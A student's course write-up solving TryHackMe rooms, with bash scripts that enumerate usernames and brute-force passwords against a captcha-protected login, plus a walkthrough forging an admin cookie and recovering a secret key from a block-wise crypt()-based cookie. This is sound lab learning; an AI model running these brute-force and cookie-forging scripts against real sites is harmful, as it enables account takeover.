# Fianl Project
## Solving TryHackMe Rooms

By: Nathan Metens

---
## Intro

This is the final project for Intro to Computer Security. In this final, I completed 3 TryHackMe Rooms. The hardest one, was the "easiest" one, the easiest, was the "Security Footage" room. On average, each room took about 1-2 days to solve, working 3+ hours on each per day. This was a struggle, but I learned so much. I have a video [here]() where I go through each Room and how I solved it. This is just the documentation, explaining everything in text, showing capture, and the code.

---
## Table of Contents
1. [Capture!](#capture)
2. [Security Footage](#security-footage)
3. [Crypto Failure](#crypto-failure)

---
## Capture!
### Can you bypass the login form?
**Dificulty:** *Easy*

Although the difficaulty was "easy", this one took the longest to solve.

![image](capture/1.png)

![image](capture/2.png)

The room had two files to download: `usernames.txt` and `passwords.txt`:
![image](capture/3.png)

![image](capture/login.png)

At first, I tried random usernames to see what the message would be if I inputed something wrong:
![image](capture/user-not-exist.png)
![image](capture/4.png)

After 10 failed usernames attempts with a bas password, the error came up with a captcha math problem:
![image](capture/captcha.png)

Next, I went to the command line and used curl for faster web access. The main curl command was `curl http://10.201.63.166`. This redirected me to the login page and returned the GET. Next, I posted to the page with this curl command: `curl -X POST http://10.201.63.166/login -d "username=metens&password=pass"`, where the `-d` is for the data in the form. Now, I could enumerate much faster and saw that when I solved the captcha, the message would once again tell me that the username was non-existing:
![image](capture/curl-cap.png)
![image](capture/solved-cap.png)

To solve the captcha in curl, I simply added `&captcha=<result>` to the string containing the username and password.

I developed this script to continuously test each username in the `usernames.txt` file until it returned a "Invalid password" error, showing that the username was correct, but the password not.


```sh
#!/bin/bash

usernames="usernames.txt" # The usernames file
password="wrongpass"      # default password
url="http://$1/login"     # program takes ip address as first arg
attempt=223

> responses.txt

# Loop through usernames text file
tail -n +$attempt $usernames | while IFS= read -r username; do

    username=$(echo "$username" | tr -d '\r') # All usernames have carriage returns in the usernames.txt
    echo "Attempt $attempt: $username"; echo ""

    # Make initial POST request with current username
    response=$(curl -s -X POST "$url" -d "username=$username&password=$password")
    echo "$response" >> responses.txt

    # Detect captcha from the response:
    if echo "$response" | grep -q "Captcha enabled"; then
        echo "! Captcha triggered. Solving..."

	# Extract and solve captcha expression from response:
        captcha_expr=$(echo "$response" | grep -Eo "[0-9]{1,4} [-+*/] [0-9]{1,4}")

        # Solve captcha:
        if [[ -n "$captcha_expr" ]]; then
            captcha_result=$((captcha_expr))
            echo "Solved captcha: $captcha_expr = $captcha_result"

            # Retry POST with captcha answer:
            response=$(curl -s -X POST "$url" \
                -d "username=$username&password=$password&captcha=$captcha_result")
            echo "$response" >> responses.txt
        fi
    fi

    # Reevaluate response
    if echo "$response" | grep -q "does not exist"; then
        echo "$attempt -> The user $username does not exist"

    elif echo "$response" | grep -q "Invalid password"; then
        echo "***** $attempt -> Valid Username: $username *****"
        exit 0
    else 
	    continue
    fi

    ((attempt++))
done
```

After about 5-10 minutes of the program running, it finally found the correct username that returned "Invalid password":
![image](capture/username-found.png)
![image](capture/invalid-password.png)

We have successfully enumerated the username. It took **307 attempts**! Now, that we have the username, we can enumerate the password. To do that, we need to slightly update the script, I created a new one:

```sh
#!/bin/bash

passwords="passwords.txt"
url="http://$1/login"
username=$2

attempt=300

tail -n +$attempt $passwords | while IFS= read -r password; do

    password=$(echo "$password" | tr -d '\r') # In case of carriage return
    echo "Attempt $attempt: $username"; echo ""

    # Make initial POST request
    response=$(curl -s -X POST "$url" -d "username=$username&password=$password")

    # Detect Captcha
    if echo "$response" | grep -q "Captcha enabled"; then
        echo "! Captcha triggered. Solving..."

        # Extract and solve captcha expression
        captcha_expr=$(echo "$response" | grep -Eo "[0-9]{1,4} [-+*/] [0-9]{1,4}")

        if [[ -n "$captcha_expr" ]]; then
            captcha_result=$((captcha_expr))
            echo "Solved captcha: $captcha_expr = $captcha_result"

            # Retry POST with CAPTCHA answer
            response=$(curl -s -X POST "$url" \
                -d "username=$username&password=$password&captcha=$captcha_result")
        fi
    fi

    # Reevaluate response
    if echo "$response" | grep -q "Invalid password"; then
        echo "Invalid password: $password"
    else
        echo "**** Password cracked for '$username': $password ****"
        exit 1
    fi

    ((attempt++))
done
```

After 344 attempts, the password was also enumerated. So the username is "natalie" and the password is "sk8board". I went back to the url in the web and typed those in and received the flag:
![image](capture/password-found.png)
![image](capture/flag.png)
![image](capture/solved.png)

This room was about using basic curl commands, bash scripting for enumeration, and using brute force on all of the passwords and usernames in the given text files. It reminds me of using the rockyou.txt file in some of the labs to crack passwords using hashcat, but this time, through curl.

---
## Security Footage
### Perform digital forensics on a network capture to recover footage from a camera.
**Dificulty:** *Medium*

See video explanation.

---
## Crypto Failure
### Encrypting your own military-grade encryption is usually not the best idea.
**Dificulty:** *Medium*

![image](crypt/home.png)
![image](crypt/2-flag.png)

The first thing I see is this:

![image](crypt/guest.png)

I am logged in as guest, and there is a long password looking thing that is hidden. Then there is a message saying the "SSO cookie is protected using military-grade en**crypt**ion". The **crypt** highlight seems important right off the bat, so I searched it up and found [this](https://www.php.net/manual/en/function.crypt.php). In PHP, we can call a function called `crypt()`. It takes a string, and a salt. The salt allows the first string to becom hashed. This is cool.

The next thing that was interesting was "SSO cookie". I searched the web and found this: "An SSO cookie, or Single Sign-On cookie, is a small piece of data stored in a user's browser that allows them to access multiple applications or websites with a single login." So then I figured I'd investigate the page using inspect mode:

![image](crypt/inspect.png)

If we look more closely in the inspection and open the html, there is a comment that says "remember to remove .bak files". I searched the web and found this: "bak files are typically backup files used by various software applications to store copies of data. They are often created automatically when a program is about to overwrite an existing file, acting as a safeguard against data loss." Interesting, maybe I can access a `.bak` file through the url?

![image](crypt/bak.png)

I searched online for a way to curl different files ending with the `.bak` extension. I found [this tool](https://asciinema.org/a/211350) called `ffuf`. It is a fast web fuzzer that searches for files on a url using a common wordlist. I used `locate common.txt` to see where my common.txt wordlist was located and it is in `/usr/share/wordlists/dirb/common.txt` in my kali vm. The command using `ffuf` is : `ffuf -u http://10.201.8.255/FUZZ.bak` -w /usr/share/wordlists/dirb/common.txt`, where `-u` is the target url to search, and `-w` is the wordlist. `FUZZ` is what is replaced by each word in the common text file. Here is what I found:

![image](crypt/common.png)
![image](crypt/fuzz.png)

The `ffuf` tool found `index.php.bak` as one of the files, so lets visit it: `curl htt://10.201.8.255/index.php.bak`:

![image](crypt/php.conf.png)
![image](crypt/admin-res.png)

The .bak files shows that each cookie is created using the `$user` and the `$enc_secret_key` in the `generate_cookie` function. There is a `generate_salt` function that makes a salt of size 2 characters. And the check for the first flag is when the user == admin, not guest.

I see the cookie here, and it is indeed set this way for the guest user. Now, I went to the command lined and typed `curl -I http://10.201.28.11` to see only the headers of the GET response:

![image](crypt/get.png)

Right away, we can see that the cookie is different than the last time we fetched the page. After some investigation on the cookie itself, I began to notice a pattern. I looked hard at each cookie and saw that there were some `%2F` in there, this looks like a special encoding, and indeed it is! I found [this source on geeks for geeks](https://www.w3schools.com/tags/ref_urlencode.ASP) that shows what the encoding translates to:

![image](crypt/geek.png)

Geeks for Geeks said "Your browser will encode input, according to the character-set used in your page. The default character-set in HTML5 is UTF-8." So each cookie is a url encoded string. This means I can decode them. I found [this page here for url decoding](https://www.urldecoder.org/). I decoded two cookies I fetched from the url, and found a pattern:

![image](crypt/url-decode.png)

```
// The first url-decoded cookie:
RXxvlsMaeHe5URXrJVbD8zZ4nkRXEwZI8bhi..cRXvtYh5l5EBtIRXqC5B7tEo6T.RXhnpA/XzKVOURXsDqDjyoBgWcRXX86PX1JkHnARXlDxDPYNU2xwRX7ExYaVdHQ82RXLdFhenadnlYRXjAFBN.glgAsRX/XEzkeYYgr.RXp8.J05UGQYURXM9RxACEm8eURXRCcStHme13oRXAbZixFAnxe2RXzW1DwG/NNdgRXRCaaDN21g8oRXqQ4hwNqRCakRXWYWirH33lewRXmY9pJ5PrOmg

// A pattern emerges:
RXxvlsMaeHe5U
RXrJVbD8zZ4nk
RXEwZI8bhi..c
RXvtYh5l5EBtI
RXqC5B7tEo6T.
RXhnpA/XzKVOU
RXsDqDjyoBgWc
RXX86PX1JkHnA
RXlDxDPYNU2xw
RX7ExYaVdHQ82
RXLdFhenadnlY
RXjAFBN.glgAs
RX/XEzkeYYgr.
RXp8.J05UGQYU
RXM9RxACEm8eU
RXRCcStHme13o
RXAbZixFAnxe2
RXzW1DwG/NNdg
RXRCaaDN21g8o
RXqQ4hwNqRCak
RXWYWirH33lew
RXmY9pJ5PrOmg


// Here is another cookie from a separate fetch (url decoded):
K4TrHf32Nu9G.
K4FrTexv8C4VU
K4NJcVzyVYEzY
K4Iyl.ZSF9GzU
K46yDRqwK7EdU
K4.dySrT4OqCU
K4VfcsBYZaBF2
K4bkC20QpLfiY
K4oT6ozqf1zwE
K4OVShJS68db6
K4q02aCkYV02s
K4pPGaUryQvuo
K4BsowGU2K8fg
K4U84anNv27jw
K4gAoVne/4Vt.
K4Vso6wOHZAXU
K4SK9J8148JZg
K4/gPoUIjXQvk
K4v2H8OF9qZzg
K4ySMUEaDhxOU
K4Fxc6OjJk2vQ
K4tmO.adIxnao
K4ttTk.OLLGqw
K4hjWOKhaYzXk
K4iFUbubW7BUY
K4gcq/s7xWkoQ
K4fVm9kQ2U2X.
K4sOJCu7ZIO8o
K4FsXb3FcELfg
```

This pattern shows that the first two characters of each 13 character long block is the same. I went back to investigate the lecture slides "CryptAndPasswords". The first two characters of each block in the cookie appear to be a salt. And we learned that a short salt is the wrong way to go. Since the salt must be unique per user and per password, this is why it is a new random salt each time we fetch the url.

If we remember, the "Set-Cookie" field returned when investigating the headers was set to guest. I changed it to admin and refreshed the page:

![image](crypt/admin.png)

This did nothing, and actually logged me out! It turns out that the cookie string is made up of the following sections:

"user:user_agent:encrypted_key".

The `:` are the delimiters between each. If we curl again, this time with the verbose option, we can see the user agent:

![image](crypt/verbose.png)

The hashed cookie then looks like this:

"guest:curl/8.14.1:<encrypted_key>"

Now, if we use the php crypt function I found earlier, and use the salt "Fh", we get this:

![image](crypt/func.png)

The result of the crypt function is the same as the first 13 bytes of data in the verbose curl!
This means that every 8 bytes in the unhashed connection of terms, we hash it using the crypt function.

The next thing to do is to hash the admin user into the cookie to trick the browser that we are logged in as admin. First I ran the crypt function on the admin user with the salt "Fh":

```php
echo crypt("admin:cu", "Fh"); // FhktSQgm9fXKU
```

The trick is to perform a curl that saves the cookie in a txt file, then edit the first chunk in the cookie to have the admin user, and then curl the url with the cookie:

```
curl -I -c cookie.txt http://<ip>
// Edit the cookie with the new random salt and resent with admin instead of guest
curl -I -b cookie.txt http://<ip>
```

![image](crypt/save-cookie.png)
![image](crypt/change-cookie.png)
![image](crypt/re-use-cookie.png)

As we can see, we have successfully recieved the first flag after tricking the browser that we were admin, by changing the user hash in the secure cookie variable.

Now, the fetched page says "Now I want the key". That is the part that comes after the user and the user_agent in the colon separated cookie.

To do this, I wrote a script with the help of AI that will curl the ip address each time to brute force the secret key, and then decipher the secret key:

```sh
#!/bin/bash

# Target URL (root path):
TARGET="http://$1/"

# Charset for the possible flag, def "THM{...}"
CHARSET="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!/_{}"

# After a stall, get the found from the recovered.txt file:
FOUND=""
if [[ -f recovered.txt ]]; then
  FOUND=$(<recovered.txt)
  echo "[*] Resuming from saved state: '$FOUND'"
fi

# Build user agent from 256 'A's and shift based on FOUND length:
UA=$(printf 'A%.0s' {1..256}) # user agent = 'AAAAAAA ... AAAAA'
shift_count=${#FOUND}         # The recovered flag from the previous run and count its length
UA="${UA:shift_count}"        # Shift the user agent back by the length of the flag found so far

# Compute TEST_WINDOW from full known string
FULL_KNOWN="guest:${UA}:${FOUND}" # Re-build the fully known flag, and keep the user agent AAAAAAAs 
TEST_WINDOW="${FULL_KNOWN: -8}"   # Update the string window to test the newly, updated secret key

# Start, or continue from where we left of in recovered.txt
echo "[*] Starting brute-force against $TARGET ..."
while true; do
  echo
  echo "[*] Known so far: '$FOUND'"
  echo "[*] Fetching cookie with UA length ${#UA}..." # Get the new user agent length

  # Fetch secure_cookie header
  raw_hdr=$(curl -s -D - -A "$UA" "$TARGET" | grep -i '^Set-Cookie: secure_cookie=' || true) # get the secure_cookie
  cookie_val=$(printf '%s' "$raw_hdr" | sed -E 's/.*secure_cookie=([^;]+).*/\1/') # get the cookie value
  # URL-decode the cookie:
  decoded=$(printf '%b' "${cookie_val//%/\\x}") 
  
  # Extract salt and full hash
  SALT="${decoded:0:2}" # The first two characters of the decoded cookie is the salt
  SECURE_COOKIE="$decoded"
  echo "[*] Salt='$SALT'  Cookie='$SECURE_COOKIE'"

  # Slide UA window
  UA="${UA:1}" # Decrease the size of the user agent each time 

   
  echo "[*] Brute-forcing next character..."
  next_char=""
  # Loop through the charset "abcd...ABCD...12345...{}/" and check the result of the hash and the salt with the current block
  for (( i=0; i<${#CHARSET}; i++ )); do
    CH="${CHARSET:i:1}"
    CANDIDATE="${TEST_WINDOW:1}${CH}" # Test the candidate character from the charset
    # Call the crypt function using php with the salt 
    HASH=$(CANDIDATE="$CANDIDATE" SALT="$SALT" php -r 'echo crypt(getenv("CANDIDATE"), getenv("SALT"));')
    
    # Compare the crypt value with the current hashed value
    if [[ "$SECURE_COOKIE" == *"$HASH"* ]]; then
      next_char="$CH"
      FOUND+="$CH" # If match is found, we found the next valid character for the flag
      TEST_WINDOW="$CANDIDATE"
      echo "[+] Found byte: '$CH'  →  '$FOUND'"
      echo "$FOUND" > recovered.txt # save the updated flag to the file in case of hang or exit
      break
    fi
  done
done

echo
echo "=== SECRET RECOVERED ==="
echo "$FOUND" # Display the flag
```

This program took multiple days and many hours to make work. 

How it works is this:

Basically, the script brute forces the secure_cookie string that is returned from a GET request to the server. We know the beginning two sections of the secure_cookie string: "guest:AAAAAAAA....:<secret_key>" and we control the user agent in the middle. Our goal is to move an 8 byte character window across the `<secret_key>` portion of the cookie, comparing one character at a time from the charset "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!/_{}" until we get the matching block in the cookie, meaning we found the correct character at that instance. Then we shift the window forward to find the next one.

Here is an example:

Let's say that the secure string is this: "guest:AAAA...A:THM{key_1}" (we have control of the user agent). Since we are working in 8 byte character chunks, we already know the beginning hashed portion (assuming the salt is "2C"): crypt("guest:AA", "2C") ==> 2CT34kM2n/Ikg. Now, we go all the way to the end, only exposing 1 character of the secret key: crypt("AAAAAA:?", "2C"), where the `?` is the unkown 7th character. We replace the `?` with a character from the charset and loop through it until we find the matching last 13 byte url decoded block that is in the secure cookie. Then we append that found character to the FOUND key variable in the script.

We know from the example above that "guest:AAAA...A:THM{key_1}" is the string when it is not crypted. So the first character in the secret key is 'T'. This means, the last block in the cookie would be: 2CMT56W4uaPKU. We loop through the entire charset until we find get to the letter T and we get a matching hash.

Then, we shorten the user agent on the next consecutive curl call to the server, get a new cookie, shift our 13 byte url encoded window down one character until we get to the new unknown character in the secret key, loop through the charset again until our crypt method matches the block from the secure cookie that was saved in the cookie.txt file from the curl,and then repeat until all characters in the secret key have been cracked.

1. the string: "guest:AAAAAAAA:THM{key}"

2. Generate a random salt: "2C".

3. The `index.php.bak` file on the server takes the string, and encodes each 8 block byte using the salt to create a cookie:
    crypt("guest:AA", "2C") ==> 2CMT56W4uaPKU
    crypt("AAAAAA:T", "2C") ==> 2CT34kM2n/Ikg
    crypt("HM{key_1", "2C") ==> 2C.shhuEzJfOE

4. secure_cookie="2CMT56W4uaPKU2CT34kM2n/Ikg2C.shhuEzJfOE"

To decode the secret key, we move our 8 byte window so that the 8th byte is the first character in the secrete key, which is initially unknown. Then we loop through the character set until we get the matching hashed block:

crypt("AAAAAA:a", "2C") ==> no match
crypt("AAAAAA:b", "2C") ==> no match
crypt("AAAAAA:c", "2C") ==> no match
...
crypt("AAAAAA:T", "2C") ==> 2CT34kM2n/Ikg MATCH!

Now, on the next iteration (assuming the salt is the same, although in reality it isn't), we change the user agent accordingly:
"guest:AA AAAAAAAA AAAAA:T? <remaining_unkown_key>"
2CMT56W4uaPKU 2CYyjMuZ7J1O. 2CgAv.QOsc1uU ...

We loop through the charset again until our crypt function matches 2CgAv.QOsc1uU:
crypt("AAAAA:Ta", "2C") ==> no match
crypt("AAAAA:Tb", "2C") ==> no match
crypt("AAAAA:Tc", "2C") ==> no match
...
crypt("AAAAA:TH", "2C") ==> 2CgAv.QOsc1uU MATCH!

And then the next one: crypt("AAAA:THM", "2C") ==> 2C5nPXyPr/8uE
Then, once we get to the last charachter, we have successfully matched the last item and found the secret key:
crypt("M{key_1}", "2C") ==> 2Cn2UUDblLITA

Each new character cracked, we shift our user agent and make it shorter. It starts out with 256 A's, then 255 A's, etc., until the secret key is cracked.

The result of the script running in kali:

When the program hangs:
![image](crypt/hang.png)

When we continue where we left off from the previous hang:
![image](crypt/continue.png)
![image](crypt/continue1.png)

After eventually finding the flag:
![image](crypt/flag-2.png)

And the successfule completion of the room:

![image](crypt/both-flag.png)
![image](crypt/result.png)
